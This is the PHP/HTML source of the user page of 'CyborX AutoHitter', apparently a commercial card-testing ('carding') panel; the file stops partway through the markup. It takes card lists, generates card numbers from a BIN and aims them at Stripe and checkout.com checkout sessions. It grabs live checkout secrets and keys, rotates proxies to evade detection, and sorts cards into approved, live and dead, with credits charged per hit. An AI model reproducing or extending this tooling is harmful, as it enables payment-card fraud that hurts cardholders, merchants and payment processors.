<?php
// ==========================
// SECTION 1: PHP BOOTSTRAP
// ==========================
declare(strict_types=1);

require_once __DIR__ . '/../app/Bootstrap.php';
require_once __DIR__ . '/../app/Db.php';

use App\Db;

if (empty($_SESSION['uid'])) {
    header('Location: /');
    exit;
}

$pdo   = Db::pdo();
$uid   = (int)$_SESSION['uid'];
$uname = $_SESSION['uname'] ?? ('tg_' . $uid);

/** fetch user */
$st = $pdo->prepare("SELECT username, first_name, last_name, profile_picture, status, credits
                     FROM users WHERE id = :id LIMIT 1");
$st->execute([':id' => $uid]);
$row = $st->fetch(PDO::FETCH_ASSOC);
if (!$row) { header('Location: /'); exit; }

$status      = strtolower((string)($row['status'] ?? 'free')); // free | premium | admin | banned
$credits     = (int)($row['credits'] ?? 0);
$fname       = trim((string)($row['first_name'] ?? ''));
$lname       = trim((string)($row['last_name'] ?? ''));
$displayName = $fname || $lname ? trim($fname . ' ' . $lname) : ($row['username'] ?: $uname);
$profilePic  = $row['profile_picture'] ?: '/assets/images/default_profile.png';

if ($status === 'admin')      $maxChecks = 1000000000;
elseif ($status === 'premium')$maxChecks = 2000;
elseif ($status === 'free')   $maxChecks = 100;
else                          $maxChecks = 10;

/* Fetch user's saved proxies for the dropdown */
$stmt = $pdo->prepare("SELECT id, host, port, username, password, ptype FROM user_proxies WHERE user_id = :uid ORDER BY created_at DESC");
$stmt->execute([':uid' => $uid]);
$userProxies = $stmt->fetchAll(PDO::FETCH_ASSOC);
$proxySet    = !empty($userProxies);

// Threads (UI only, for AutoHitters we actually use it in JS)
$maxThreadsByPlan = ($status === 'premium' || $status === 'admin') ? 1 : 1;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Auto Hitters • CyborX</title>

<!-- ==========================
     SECTION 2: FONTS & LIBS
=========================== -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
<script src="https://unpkg.com/@tailwindcss/browser@4"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">

<style>
    :root{
      --bg:#0b1220;
      --card:#0f172a;
      --border:rgba(255,255,255,.10);
      --muted:#94a3b8;
      --text:#e5e7eb;
      --accent1:#22c55e;
      --accent2:#60a5fa;
      --ring:#10b981;
    }
    html, body { height: 100%; margin: 0; overflow-x: hidden; }
    body {
      font-family: 'Inter', sans-serif;
      color: var(--text);
      background:
        radial-gradient(1200px 600px at 10% -10%, rgba(16,185,129,.12), transparent 60%),
        radial-gradient(1000px 500px at 110% 10%, rgba(59,130,246,.12), transparent 60%),
        linear-gradient(180deg, #0a0f1f 0%, #0b1220 100%);
    }

    /* Background grid */
    main::before{
      content:"";
      position:fixed; inset:0;
      background-image:
        linear-gradient(to right, rgba(255,255,255,.04) 1px, transparent 1px),
        linear-gradient(to bottom, rgba(255,255,255,.04) 1px, transparent 1px);
      background-size: 40px 40px;
      mask-image: radial-gradient(800px 400px at 50% 0%, rgba(255,255,255,.4), transparent 70%);
      pointer-events:none;
    }

    /* Card (glass + gradient border) */
    .glass {
      position: relative;
      border-radius: 18px;
      background: linear-gradient(180deg, rgba(17,24,39,.55), rgba(15,23,42,.55));
      border: 1px solid var(--border);
      overflow: hidden;
    }
    .glass::before{
      content:""; position:absolute; inset: -1px;
      background: linear-gradient(135deg, rgba(16,185,129,.35), rgba(59,130,246,.35), transparent 60%);
      filter: blur(18px); opacity:.3; pointer-events:none;
    }
    .card-shadow { box-shadow: 0 10px 30px rgba(0,0,0,.35); }

    .btn-primary {
      background: linear-gradient(90deg, var(--accent1) 0%, var(--accent2) 100%);
      color:#04121b; font-weight:700;
      transition: transform .15s ease, box-shadow .2s ease;
    }
    .btn-primary:hover{
      transform: translateY(-1px);
      box-shadow: 0 8px 24px rgba(16,185,129,.25);
    }
    .btn-muted {
      background:#111827;
      border:1px solid var(--border);
      color:#e5e7eb;
    }
    .btn-muted:hover{ background:#1f2937; }

    .btn-grab {
      background: linear-gradient(135deg, #8b5cf6 0%, #a855f7 50%, #ec4899 100%);
      color: white;
      font-weight: 600;
      transition: all 0.2s ease;
      box-shadow: 0 4px 14px 0 rgba(139, 92, 246, 0.4);
    }
    .btn-grab:hover:not(:disabled) {
      transform: translateY(-1px);
      box-shadow: 0 6px 20px 0 rgba(139, 92, 246, 0.5);
    }
    .btn-grab:disabled {
      opacity: 0.7;
      cursor: not-allowed;
      transform: none;
    }

    .section-title{
      font-family: "Space Grotesk", sans-serif;
      letter-spacing:.2px;
      background: linear-gradient(90deg,#e5e7eb 0%,#8abef8 60%,#34d399 100%);
      -webkit-background-clip:text; background-clip:text; color:transparent;
    }

    .select-container select, .input-like, textarea, input[type="text"]{
      appearance: none;
      border:1px solid var(--border);
      background:#0b1730; color:var(--text);
      border-radius:12px; padding:.7rem .9rem; font-size:.92rem;
      outline:none; transition: border-color .2s ease, box-shadow .2s ease, background .2s ease;
    }
    .select-container select:focus, .input-like:focus, textarea:focus, input[type="text"]:focus{
      border-color: rgba(16,185,129,.6);
      box-shadow: 0 0 0 4px rgba(16,185,129,.12);
    }

    .profile-pic { width: 56px; height: 56px; border-radius:9999px; object-fit:cover; border:2px solid rgba(255,255,255,.18); }
    .avatar-ring { padding: 2px; border-radius: 9999px; background: linear-gradient(135deg, rgba(16,185,129,.6), rgba(59,130,246,.6)); display:inline-block; }
    .name { font-weight: 700; }
    .badge { padding:.18rem .45rem; border-radius:7px; font-size:.7rem; background: rgba(255,255,255,.08); border:1px solid var(--border); }

    /* Results typography */
    pre.result{
      background: #0d152b;
      border:1px dashed rgba(148,163,184,.25);
      border-radius: 12px;
      padding: 14px 14px;
      line-height: 1.4;
      white-space: pre-wrap;
      word-break: break-word;
      overflow-wrap: anywhere;
    }
    .line-ok { border-left:3px solid #f59e0b; padding-left:.55rem; }
    .line-live { border-left:3px solid #34d399; padding-left:.55rem; }
    .line-dead { border-left:3px solid #ef4444; padding-left:.55rem; }

    /* Blur Mode */
    #mainRoot.blur-mode #cardList,
    #mainRoot.blur-mode input[type="text"],
    #mainRoot.blur-mode textarea,
    #mainRoot.blur-mode .cc-mask {
      filter: blur(7px);
    }

    /* Tools Drawer (modal) */
    .tools-backdrop { position: fixed; inset: 0; background: rgba(2,6,23,.55); backdrop-filter: blur(2px); display:none; }
    .tools-backdrop.active { display:block; }
    .tools-drawer { position: fixed; right: -440px; top: 0; height: 100vh; width: 440px; max-width: 100vw;
      background: linear-gradient(180deg,#0b1220,#0c1628); border-left: 1px solid var(--border);
      transition: right .25s ease; z-index: 60; overflow-y: auto; }

    @media (max-width: 1024px) {
      .profile-pic { width: 44px; height: 44px; }
    }

    /* Dark select + dropdown option FIX */
    .select-container select,
    #proxySelect{
      background:#0b1730 !important;
      color:#e5e7eb !important;
      border:1px solid rgba(255,255,255,.12) !important;
      color-scheme: dark;
    }
    #proxySelect option{ background:#0b1730; color:#e5e7eb; }

    /* Progress bar */
    #progressWrap{
      margin-top:12px; height:14px; border-radius:10px;
      background:#0e1730; border:1px solid rgba(255,255,255,.10); position:relative; overflow:hidden;
    }
    #progressBar{
      position:absolute; inset:0; width:0%;
      background:linear-gradient(90deg,#22c55e,#60a5fa);
    }
    #progressText{ margin-top:8px; font-size:.85rem; color:#94a3b8; }

    /* API status pill */
    .api-pill{
      display:inline-flex; align-items:center; gap:.4rem; font-size:.78rem;
      padding:.25rem .5rem; border-radius:.5rem; border:1px solid rgba(255,255,255,.12);
    }
    .api-pill.ok{ color:#22c55e; background:rgba(34,197,94,.12); }
    .api-pill.down{ color:#f87171; background:rgba(248,113,113,.12); }

    @media (max-width:1366px){
      .glass.p-8{ padding:1.25rem !important; }
      .grid.gap-8{ gap:1.25rem !important; }
    }

    /* Fancy dropdown (Config modal list) */
    .fsel-list{display:grid;gap:.5rem}
    .fsel-item{
      display:flex; align-items:center; justify-content:space-between;
      padding:.85rem 1rem; border-radius:12px;
      background:#0d152b; border:1px solid rgba(255,255,255,.10);
      transition:transform .12s ease, border-color .12s ease, background .12s ease;
    }
    .fsel-item:hover{
      transform: translateY(-1px);
      border-color: rgba(34,197,94,.35);
      background:#0f1936;
    }
    .fsel-left{ display:flex; gap:.8rem; align-items:center; }
    .fsel-ico{ width:28px; height:28px; display:grid; place-items:center; border-radius:8px;
      background:rgba(148,163,184,.12); font-size:16px; }
    .fsel-title{ font-weight:600; }
    .fsel-sub{ font-size:.82rem; color:#9fb3c8; margin-top:.1rem }
    .fsel-right{ display:flex; gap:.5rem; align-items:center; }
    .badge-s{ font-size:.70rem; padding:.12rem .4rem; border-radius:.4rem; border:1px solid rgba(255,255,255,.12); }
    .badge-ok{ color:#22c55e; background:rgba(34,197,94,.12); }
    .badge-down{ color:#f87171; background:rgba(248,113,113,.12); }
    .fsel-item.active{ outline:2px solid rgba(34,197,94,.35); }

    /* Config modal */
    #cfgModal .sheet{ width:100%; max-width:720px; }
    .stepper{ display:flex; gap:.5rem; margin-bottom:1rem }
    .step{
      flex:1; text-align:center; font-size:.85rem;
      padding:.55rem .4rem; border-radius:.6rem;
      border:1px solid rgba(255,255,255,.10); background:#0e1730; color:#cbd5e1;
    }
    .step.on{
      background:linear-gradient(90deg,#22c55e33,#60a5fa33);
      border-color:rgba(16,185,129,.35);
      color:#e5e7eb; font-weight:600;
    }

    /* Hide inline selects (we drive config from modal) */
    #inlineConfigRow{ display:none !important; }

    /* Dark select fix in modal */
    #cfgProxySelect, #proxySelect{
      background:#0b1730 !important; color:#e5e7eb !important;
      border:1px solid rgba(255,255,255,.12) !important;
      color-scheme: dark;
    }
    #cfgProxySelect option, #proxySelect option{ background:#0b1730; color:#e5e7eb; }

    input[readonly] {
      background: rgba(15, 23, 42, 0.6) !important;
      border-color: rgba(34, 197, 94, 0.2) !important;
      color: #34d399 !important;
      font-weight: 500;
    }
    input[readonly]:focus {
      border-color: rgba(34, 197, 94, 0.4) !important;
      box-shadow: 0 0 0 3px rgba(34, 197, 94, 0.1) !important;
    }
</style>
</head>
<body class="min-h-full">
<main id="mainRoot" class="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8 pb-8">
  <?php if(!$proxySet): ?>
    <div class="mb-8 rounded-xl border border-amber-400/30 bg-amber-500/10 text-amber-200 px-6 py-4 text-sm font-medium">
      ⚠️ Proxy Required! Please set up proxy (host/port/type) in Settings to proceed.
    </div>
  <?php endif; ?>

  <div class="mb-2"></div>

  <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
    <!-- ==========================
         SECTION 3: LEFT PANEL (AUTOHITTER CONTROLS)
    =========================== -->
    <section class="lg:col-span-2 glass card-shadow p-8">
      <h2 class="text-2xl section-title mb-6">CyborX AutoHitter</h2>

      <!-- (Hidden) inline config row - driven via modal -->
      <div id="inlineConfigRow" class="grid sm:grid-cols-3 gap-6">
        <div class="sm:col-span-1 select-container">
          <label class="block text-sm font-medium text-slate-200 mb-2">Select Gateway</label>
          <select id="gateway" class="w-full px-4 py-3 text-sm">
            <option value="">Select Gateway</option>
            <option value="checkout">Checkout</option>
            <option value="stripe">Stripe</option>
          </select>
        </div>
        <div class="sm:col-span-1 select-container">
          <label class="block text-sm font-medium text-slate-200 mb-2">Select API</label>
          <select id="api" class="w-full px-4 py-3 text-sm"></select>
          <div id="apiStatusPill" class="api-pill mt-2" style="display:none;">—</div>
          <p id="apiLockHint" class="text-[12px] mt-2 text-rose-300 hidden">
            Some APIs are locked for your plan. Upgrade to unlock 🔒
          </p>
        </div>
        <div class="sm:col-span-1">
          <label class="block text-sm font-medium text-slate-200 mb-2">Proxy Settings</label>
          <div class="flex items-center gap-4">
            <label class="inline-flex items-center cursor-pointer">
              <input id="proxySwitch" type="checkbox" class="peer sr-only">
              <span class="w-11 h-6 bg-slate-700 rounded-full relative
                           after:content-[''] after:absolute after:top-0.5 after:left-0.5
                           after:w-5 after:h-5 after:bg-white after:rounded-full after:transition-all
                           duration-300 peer-checked:bg-emerald-500 peer-checked:after:left-[1.5rem]"></span>
            </label>
            <span class="text-sm text-slate-200">Use proxy</span>
          </div>
          <?php if($proxySet): ?>
            <div class="text-xs mt-2 text-emerald-300">Proxy configured ✅</div>
          <?php else: ?>
            <div class="text-xs mt-2 text-rose-300">Proxy missing ❌</div>
          <?php endif; ?>

          <div id="proxySelectContainer" class="hidden mt-2">
            <label class="block text-sm font-medium text-slate-200 mb-1">Select Proxy</label>
            <select id="proxySelect" class="w-full px-3 py-2 text-sm">
              <option value="random">Random</option>
              <?php foreach ($userProxies as $proxy): ?>
                <option value="<?= htmlspecialchars(json_encode([
                  'host' => $proxy['host'],
                  'port' => $proxy['port'],
                  'username' => $proxy['username'] ?? '',
                  'password' => $proxy['password'] ?? ''
                ]), ENT_QUOTES, 'UTF-8') ?>">
                  <?= htmlspecialchars("{$proxy['host']}:{$proxy['port']} ({$proxy['ptype']})", ENT_QUOTES, 'UTF-8') ?>
                </option>
              <?php endforeach; ?>
            </select>
          </div>
        </div>
      </div>

      <!-- Configure + Tools buttons -->
      <div class="mt-4 flex gap-2">
        <button id="openCfgBtn" class="rounded-lg px-4 py-2 btn-muted text-sm">
          <i class="fa-solid fa-sliders mr-1"></i> Configure (Gateway • API • Proxy)
        </button>
        <button id="openToolsBtn" class="rounded-lg px-4 py-2 btn-muted text-sm">
          <i class="fa-solid fa-wrench mr-1"></i> Tools
        </button>
      </div>

      <!-- Card List -->
      <div class="mt-6">
        <label class="block text-sm font-medium text-slate-200 mb-2">Card List</label>
        <textarea id="cardList" class="w-full h-64 px-4 py-3 text-sm font-mono" placeholder="cc|mm|yyyy|cvv — one per line"></textarea>
      </div>

      <!-- Import cards -->
      <div class="mt-4">
        <label class="inline-flex items-center justify-center w-full rounded-lg border border-white/10 bg-slate-900/60 hover:bg-slate-800 px-4 py-3 text-sm cursor-pointer transition">
          <input id="fileInput" type="file" accept=".txt" hidden>
          <span class="inline-flex items-center gap-2">
            <i class="fa-solid fa-arrow-up-from-bracket"></i> Import Cards (.txt)
          </span>
        </label>
      </div>

      <!-- ==========================
           SECTION 4: AUTOHITTER EXTRA INPUTS
      =========================== -->

      <!-- Checkout URLs (PayCheckout Hitter) -->
      <div id="urlInputContainer" class="mt-4 hidden">
        <label class="block text-sm font-medium text-slate-200 mb-2">
          Checkout URLs (1–50 • one per line • Required)
        </label>
        <textarea id="urlInput" class="w-full input-like min-h-28"
          placeholder="https://pay.checkout.com/page/hpp_xxxxxx"></textarea>
      </div>

      <!-- Stripe Inbuilt AutoHitters -->
      <div id="stripeInputContainer" class="mt-4 hidden">
        <label class="block text-sm font-medium text-slate-200 mb-2">Stripe Configuration (Inbuilt AutoHitters)</label>
        <div class="flex flex-col gap-4">
          <div>
            <label class="block text-xs font-medium text-slate-200 mb-1">Client Secret (Required)</label>
            <input id="stripeClientSecret" type="text" class="w-full input-like" placeholder="Enter Client Secret">
          </div>
          <div>
            <label class="block text-xs font-medium text-slate-200 mb-1">PK Key (Required)</label>
            <input id="stripePkKey" type="text" class="w-full input-like" placeholder="Enter PK Key">
          </div>
          <div>
            <label class="block text-xs font-medium text-slate-200 mb-1">Acct (Optional)</label>
            <input id="stripeAcct" type="text" class="w-full input-like" placeholder="Enter Acct (Optional)">
          </div>
        </div>
      </div>

      <!-- Stripe Checkout Hitter -->
      <div id="stripeCheckoutInputContainer" class="mt-4 hidden">
        <label class="block text-sm font-medium text-slate-200 mb-2">Stripe Checkout Configuration</label>
        <div class="flex gap-4 mb-4">
          <input id="checkoutLinkInput" type="text" class="flex-1 input-like" placeholder="https://checkout.stripe.com/c/pay/cs_live_... (Paste full link)">
          <button id="grabCsPkBtn" class="px-6 py-2.5 btn-grab flex items-center">
            <i class="fas fa-magic mr-2"></i>Grab CS/PK
          </button>
        </div>
        <div class="grid grid-cols-2 gap-4">
          <div>
            <label class="block text-xs font-medium text-slate-200 mb-1">cs_live</label>
            <input id="cs_live" type="text" class="w-full input-like">
          </div>
          <div>
            <label class="block text-xs font-medium text-slate-200 mb-1">pk_live</label>
            <input id="pk_live" type="text" class="w-full input-like">
          </div>
          <div>
            <label class="block text-xs font-medium text-slate-200 mb-1">email</label>
            <input id="checkout_email" type="text" class="w-full input-like">
          </div>
          <div>
            <label class="block text-xs font-medium text-slate-200 mb-1">amount</label>
            <input id="checkout_amount" type="text" class="w-full input-like">
          </div>
        </div>
        <p class="text-xs text-emerald-400 mt-3 flex items-center">
          <i class="fas fa-info-circle mr-1"></i>
          Sometimes you need to fill some fields if empty (email / amount).
        </p>
      </div>

      <!-- Actions + Progress -->
      <div class="mt-6 flex flex-wrap items-center gap-4">
        <button id="btnStart" class="rounded-lg btn-primary px-6 py-3 text-sm">
          <i class="fas fa-play mr-1"></i> Start Hitting
        </button>
        <button id="btnStop" class="rounded-lg bg-rose-500/90 px-6 py-3 text-sm font-semibold text-white hover:bg-rose-500 disabled:opacity-50" disabled>
          <i class="fas fa-stop mr-1"></i> Stop
        </button>
        <button id="btnClear" class="rounded-lg btn-muted px-6 py-3 text-sm">
          <i class="fas fa-trash mr-1"></i> Clear All
        </button>
      </div>

      <div id="progressWrap" class="hidden"><div id="progressBar"></div></div>
      <div id="progressText" class="hidden">0% • 0/0</div>
    </section>

    <!-- ==========================
         SECTION 5: RIGHT PANEL (STATS)
    =========================== -->
    <aside class="glass card-shadow p-8">
      <h2 class="text-2xl section-title mb-6">Statistics</h2>

      <div class="border border-white/10 bg-gradient-to-b from-slate-900/60 to-slate-800/40 rounded-xl p-3 mb-4 flex items-center gap-3">
        <div class="avatar-ring">
          <img src="<?= htmlspecialchars($profilePic, ENT_QUOTES, 'UTF-8') ?>" alt="Profile" class="profile-pic">
        </div>
        <div class="min-w-0">
          <div class="flex items-center gap-2">
            <span class="name truncate" title="<?= htmlspecialchars($displayName, ENT_QUOTES, 'UTF-8') ?>">
              <?= htmlspecialchars($displayName, ENT_QUOTES, 'UTF-8') ?>
            </span>
            <span class="badge"><?= ucfirst($status) ?></span>
          </div>
          <div class="mt-0.5 text-sm text-slate-400 truncate" title="@<?= htmlspecialchars($uname, ENT_QUOTES, 'UTF-8') ?>">
            @<?= htmlspecialchars($uname, ENT_QUOTES, 'UTF-8') ?>
          </div>
        </div>
      </div>

      <ul class="space-y-4 text-sm">
        <li class="flex items-center justify-between">
          <span class="inline-flex items-center gap-2">
            <i class="fas fa-list-ul text-sky-400"></i> Total Cards
          </span>
          <span id="statTotal" class="font-semibold">0</span>
        </li>
        <li class="flex items-center justify-between">
          <span class="inline-flex items-center gap-2">
            <i class="fas fa-check-circle text-amber-300"></i> Approved
          </span>
          <span id="statApproved" class="font-semibold text-amber-300">0</span>
        </li>
        <li class="flex items-center justify-between">
          <span class="inline-flex items-center gap-2">
            <i class="fas fa-heartbeat text-emerald-400"></i> Live
          </span>
          <span id="statLive" class="font-semibold text-emerald-400">0</span>
        </li>
        <li class="flex items-center justify-between">
          <span class="inline-flex items-center gap-2">
            <i class="fas fa-ban text-rose-400"></i> Dead
          </span>
          <span id="statDead" class="font-semibold text-rose-400">0</span>
        </li>
        <li class="flex items-center justify-between">
          <span class="inline-flex items-center gap-2">
            <i class="fas fa-clock text-sky-400"></i> Remaining
          </span>
          <span id="statYet" class="font-semibold">0</span>
        </li>
        <li class="flex items-center justify-between">
          <span class="inline-flex items-center gap-2">
            <i class="fas fa-coins text-yellow-300"></i> Credits
          </span>
          <span id="statCred" class="font-semibold text-yellow-300"><?= (int)$credits ?></span>
        </li>
        <li class="flex items-center justify-between">
          <span class="inline-flex items-center gap-2">
            <i class="fas fa-stopwatch text-fuchsia-300"></i> Limit
          </span>
          <span id="statLimit" class="font-semibold text-fuchsia-300"><?= number_format($maxChecks) ?></span>
        </li>
        <li class="flex items-center justify-between">
          <span class="inline-flex items-center gap-2">
            <i class="fas fa-server text-cyan-300"></i> Current API
          </span>
          <span id="statGateway" class="font-semibold text-cyan-300">Select API</span>
        </li>
        <li class="flex items-center justify-between">
          <span class="inline-flex items-center gap-2">
            <i class="fas fa-tachometer-alt text-emerald-400"></i> Gate Speed (avg)
          </span>
          <span id="statSpeed" class="font-semibold">—</span>
        </li>
        <li class="mt-3">
          <div class="text-xs text-slate-400 mb-1">Per-API Speed (this session)</div>
          <ul id="apiSpeedList" class="text-sm space-y-1"></ul>
        </li>
      </ul>
    </aside>
  </div>

  <!-- ==========================
       SECTION 6: TABS + RESULT PANELS
  =========================== -->
  <div class="mt-10 flex items-center justify-center gap-3">
    <button id="tabApproved" class="rounded-xl px-4 py-2 text-sm font-medium btn-muted">Approved</button>
    <button id="tabLive" class="rounded-xl px-4 py-2 text-sm font-medium btn-muted">Live</button>
    <button id="tabDead" class="rounded-xl px-4 py-2 text-sm font-medium btn-muted">Dead</button>
  </div>

  <section class="mt-6 space-y-6">
    <div id="panelApproved" class="glass card-shadow p-6">
      <div class="flex items-center justify-between">
        <h3 class="text-lg font-semibold">Approved Results</h3>
        <button id="copyApproved" class="rounded-lg btn-muted px-4 py-2">Copy</button>
      </div>
      <pre id="approvedBox" class="result mt-4 text-[13px] min-h-24"></pre>
    </div>

    <div id="panelLive" class="glass card-shadow p-6 hidden">
      <div class="flex items-center justify-between">
        <h3 class="text-lg font-semibold">Live Results</h3>
        <button id="copyLive" class="rounded-lg btn-muted px-4 py-2">Copy</button>
      </div>
      <pre id="liveBox" class="result mt-4 text-[13px] min-h-24"></pre>
    </div>

    <div id="panelDead" class="glass card-shadow p-6 hidden">
      <div class="flex items-center justify-between">
        <h3 class="text-lg font-semibold">Dead Results</h3>
        <button id="clearDead" class="rounded-lg px-4 py-2 bg-rose-500/15 border border-rose-400/30 hover:bg-rose-500/25 text-rose-200">Clear</button>
      </div>
      <pre id="deadBox" class="result mt-4 text-[13px] min-h-24"></pre>
    </div>
  </section>
</main>

<!-- ==========================
     SECTION 7: TOOLS MODAL (CC GENERATOR)
=========================== -->
<div id="toolsModal" class="fixed inset-0 z-[120] hidden">
  <div class="absolute inset-0 bg-slate-900/70 backdrop-blur-sm"></div>
  <div class="relative min-h-full flex items-end sm:items-center justify-center p-4">
    <div id="toolsSheet" class="w-full max-w-lg translate-y-4 opacity-0 transition-all duration-200">
      <div class="rounded-2xl border border-white/10 bg-gradient-to-b from-slate-900 to-slate-800 shadow-2xl">
        <div class="px-5 py-4 border-b border-white/10 flex items-center justify-between">
          <h3 class="text-lg font-semibold">
            <i class="fa-solid fa-toolbox mr-2"></i>Tools
          </h3>
          <button id="toolsClose" class="px-3 py-1.5 rounded-md btn-muted text-sm">
            <i class="fa-solid fa-xmark"></i>
          </button>
        </div>

        <div class="p-4">
          <div class="rounded-xl border border-white/10 bg-slate-900/50 p-4">
            <h4 class="text-center text-amber-400 font-bold mb-3">CC GENERATOR</h4>
            <div class="grid grid-cols-2 gap-3">
              <input id="genbin" class="col-span-2 input-like text-center" placeholder="BIN HERE (example - 401924)">
              <input id="genqty" class="input-like text-center" placeholder="QTY (e.g., 10)">
              <input id="gencvv" class="input-like text-center" placeholder="CVV (optional)">
              <div class="col-span-1">
                <select id="month" class="input-like w-full">
                  <option value="Random">MONTH</option>
                  <option value="Random">RANDOM</option>
                  <?php for($m=1;$m<=12;$m++): $mm=str_pad((string)$m,2,'0',STR_PAD_LEFT); ?>
                    <option value="<?= $mm ?>"><?= $m ?></option>
                  <?php endfor; ?>
                </select>
              </div>
              <div class="col-span-1">
                <select id="year" class="input-like w-full">
                  <option value="Random">YEAR</option>
                  <option value="Random">RANDOM</option>
                  <?php for($y=(int)date('Y');$y<=((int)date('Y')+7);$y++): ?>
                    <option value="<?= $y ?>"><?= $y ?></option>
                  <?php endfor; ?>
                </select>
              </div>
            </div>
            <button id="btnGen" class="mt-3 w-full rounded-lg px-4 py-2 btn-muted">
              <i class="fa-solid fa-wand-magic-sparkles mr-1"></i> Generate → Add to Card List
            </button>
          </div>
        </div>
        <!-- /Tools content -->
      </div>
    </div>
  </div>
</div>

<!-- ==========================
     SECTION 8: CREDITS MODAL
=========================== -->
<div id="creditsModal" class="fixed inset-0 z-[100] hidden">
  <div class="absolute inset-0 bg-slate-900/70 backdrop-blur-sm"></div>
  <div class="relative min-h-full flex items-end sm:items-center justify-center p-4">
    <div id="creditsCard" class="w-full max-w-md translate-y-4 sm:translate-y-0 opacity-0 transition-all duration-200">
      <div class="rounded-2xl border border-white/10 bg-gradient-to-b from-slate-900 to-slate-800 shadow-2xl">
        <div class="px-5 py-4 border-b border-white/10">
          <h3 class="text-lg font-semibold">Credits System</h3>
          <p class="text-xs text-slate-400 mt-0.5">
            Please review how credits are used across gates. No credits deduction for Dead Cards ⚠️
          </p>
        </div>
        <div class="px-5 py-4 space-y-4 text-sm text-slate-300">
          <div>
            <div class="text-slate-200 font-medium mb-1">Auth Gates</div>
            <ul class="space-y-1">
              <li class="flex items-center gap-2">
                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
                Approved = <span class="font-semibold"> - 3 credits</span>
              </li>
              <li class="flex items-center gap-2">
                <span class="w-1.5 h-1.5 rounded-full bg-sky-400"></span>
                Live = <span class="font-semibold"> - 1 credits</span>
              </li>
            </ul>
          </div>
          <div class="border-t border-white/10 pt-3">
            <div class="text-slate-200 font-medium mb-1">Charge Gates</div>
            <ul class="space-y-1">
              <li class="flex items-center gap-2">
                <span class="w-1.5 h-1.5 rounded-full bg-fuchsia-400"></span>
                Charge = <span class="font-semibold"> - 5 credits</span>
              </li>
              <li class="flex items-center gap-2">
                <span class="w-1.5 h-1.5 rounded-full bg-amber-400"></span>
                Live = <span class="font-semibold"> - 3 credits</span>
              </li>
            </ul>
          </div>
        </div>
        <div class="px-5 pb-5">
          <button id="ackBtn"
            class="w-full rounded-xl px-4 py-2.5 font-semibold text-slate-900"
            style="background: linear-gradient(90deg,#34d399,#67e8f9)">
            I acknowledge
          </button>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ==========================
     SECTION 9: CONFIG MODAL (GATEWAY/API/PROXY)
=========================== -->
<div id="cfgModal" class="fixed inset-0 z-[120] hidden">
  <div class="absolute inset-0 bg-slate-900/70 backdrop-blur-sm"></div>
  <div class="relative min-h-full flex items-end sm:items-center justify-center p-4">
    <div class="sheet translate-y-4 opacity-0 transition-all duration-200">
      <div class="rounded-2xl border border-white/10 bg-gradient-to-b from-slate-900 to-slate-800 shadow-2xl p-5">
        <div class="stepper">
          <div id="s1" class="step on">1. Gateway</div>
          <div id="s2" class="step">2. API</div>
          <div id="s3" class="step">3. Proxy & View</div>
        </div>

        <!-- Step 1: Gateway -->
        <div id="step1">
          <div class="text-sm text-slate-300 mb-2">Select a gateway</div>
          <div id="gwList" class="fsel-list"></div>
        </div>

        <!-- Step 2: API -->
        <div id="step2" class="hidden">
          <div class="text-sm text-slate-300 mb-2">Select an API</div>
          <div id="apiList" class="fsel-list"></div>
        </div>

        <!-- Step 3: Proxy & Blur -->
        <div id="step3" class="hidden">
          <div class="grid sm:grid-cols-2 gap-4">
            <div class="rounded-xl border border-white/10 p-4">
              <div class="text-sm font-semibold mb-2">Proxy Settings</div>
              <div class="flex items-center gap-3 mb-2">
                <label class="inline-flex items-center cursor-pointer">
                  <input id="cfgProxySwitch" type="checkbox" class="peer sr-only">
                  <span class="w-11 h-6 bg-slate-700 rounded-full relative
                               after:content-[''] after:absolute after:top-0.5 after:left-0.5
                               after:w-5 after:h-5 after:bg-white after:rounded-full after:transition-all
                               duration-300 peer-checked:bg-emerald-500 peer-checked:after:left-[1.5rem]"></span>
                </label>
                <span class="text-sm text-slate-200">Use proxy</span>
              </div>
              <div id="cfgProxySelectWrap" class="hidden">
                <label class="block text-xs text-slate-300 mb-1">Select Proxy</label>
                <select id="cfgProxySelect" class="w-full px-3 py-2 text-sm">
                  <option value="random">Random</option>
                  <?php foreach ($userProxies as $proxy): ?>
                    <option value="<?= htmlspecialchars(json_encode([
                      'host' => $proxy['host'],
                      'port' => $proxy['port'],
                      'username' => $proxy['username'] ?? '',
                      'password' => $proxy['password'] ?? ''
                    ]), ENT_QUOTES, 'UTF-8') ?>">
                      <?= htmlspecialchars("{$proxy['host']}:{$proxy['port']} ({$proxy['ptype']})", ENT_QUOTES, 'UTF-8') ?>
                    </option>
                  <?php endforeach; ?>
                </select>
              </div>
            </div>
            <div class="rounded-xl border border-white/10 p-4">
              <div class="text-sm font-semibold mb-2">Tools & View</div>
              <div class="flex items-center justify-between mb-3">
                <div class="text-sm">Blur Mode</div>
                <label class="inline-flex items-center cursor-pointer">
                  <input id="cfgBlurSwitch" type="checkbox" class="sr-only peer">
                  <span class="w-11 h-6 bg-slate-700 rounded-full relative
                               after:content-[''] after:absolute after:top-0.5 after:left-0.5
                               after:w-5 after:h-5 after:bg-white after:rounded-full after:transition-all
                               duration-300 peer-checked:bg-emerald-500 peer-checked:after:left-[1.5rem]"></span>
                </label>
              </div>
              <button id="cfgResetAllBtn"
                class="w-full rounded-lg px-4 py-2 bg-rose-500/20 hover:bg-rose-500/30 border border-rose-400/30 text-rose-200 text-sm">
                <i class="fa-solid fa-rotate-left mr-1"></i> Reset All (clear saved data)
              </button>
            </div>
          </div>
        </div>

        <!-- Modal actions -->
        <div class="mt-5 flex items-center justify-between">
          <button id="cfgCancel" class="px-4 py-2 rounded-lg btn-muted text-sm">Cancel</button>
          <div class="flex gap-2">
            <button id="cfgBack" class="px-4 py-2 rounded-lg btn-muted text-sm hidden">Back</button>
            <button id="cfgNext" class="px-4 py-2 rounded-lg btn-primary text-sm">Next</button>
